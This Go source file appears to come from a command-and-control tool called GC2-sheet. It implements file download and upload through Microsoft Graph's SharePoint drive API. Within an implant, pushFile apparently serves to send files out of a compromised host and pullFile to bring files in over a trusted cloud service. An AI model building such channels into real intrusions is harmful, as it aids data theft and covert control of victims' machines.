package C2

import (
	"GC2-sheet/internal/configuration"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
)

type MicrosoftFileSystem struct {
	client          *MicrosoftConnector
	microsoftSiteID string
}

func (fs *MicrosoftFileSystem) do(request *http.Request) (*http.Response, error) {
	return fs.client.do(request)
}

func (fs *MicrosoftFileSystem) getBaseUrl() string {
	return fmt.Sprintf(
		"https://graph.microsoft.com/v1.0/sites/%s",
		fs.microsoftSiteID,
	)
}

func NewMicrosoftFileSystem(client *MicrosoftConnector) *MicrosoftFileSystem {
	return &MicrosoftFileSystem{
		client:          client,
		microsoftSiteID: configuration.GetOptionsMicrosoftSiteID(),
	}
}

func (fs *MicrosoftFileSystem) pullFile(path string) ([]byte, error) {
	url := fmt.Sprintf("%s/drive/items/root:/%s:/content", fs.getBaseUrl(), path)
	request, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		return nil, fmt.Errorf("%w: %w", ErrorUnableToPullFile, err)
	}

	response, err := fs.do(request)
	if err != nil {
		return nil, fmt.Errorf("%w: %w", ErrorUnableToPullFile, err)
	}

	defer func(Body io.ReadCloser) {
		err := Body.Close()
		if err != nil {
			log.Printf("An error occured while closing the body during pullFile: %s\n", err)
		}
	}(response.Body)
	fileContent, err := io.ReadAll(response.Body)
	if err != nil {
		return nil, fmt.Errorf("%w: %w", ErrorUnableToPullFile, err)
	}

	return fileContent, nil
}

func (fs *MicrosoftFileSystem) pushFile(name string, file *os.File) error {
	url := fmt.Sprintf("%s/drive/items/root:/%s:/content", fs.getBaseUrl(), name)
	request, err := http.NewRequest(http.MethodPut, url, file)
	if err != nil {
		return fmt.Errorf("%w: %w", ErrorUnableToPushFile, err)
	}

	response, err := fs.do(request)
	if err != nil {
		return fmt.Errorf("%w: %w", ErrorUnableToPushFile, err)
	}

	responseStatusCode := response.StatusCode
	if responseStatusCode != http.StatusCreated && responseStatusCode != http.StatusOK {
		return fmt.Errorf("%w", ErrorUnableToPushFile)
	}

	return nil
}
